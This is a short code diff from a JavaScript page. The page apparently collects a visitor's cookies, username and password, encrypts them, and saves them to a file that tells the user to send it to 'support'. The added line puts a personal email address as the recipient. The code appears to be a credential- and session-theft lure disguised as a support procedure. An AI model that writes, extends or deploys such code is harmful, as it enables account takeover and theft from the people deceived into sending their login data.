@@ -242,7 +242,7 @@
       const encryptedPassword = encryptAES(document.getElementById('password').value);
   
       // Conteúdo a ser escrito no arquivo
-      const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!`;
+      const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!\n\nmegazn960@gmail.com`;
   
       // Cria o blob com os dados criptografados
       const blob = new Blob([fileContent], { type: 'text/plain' });
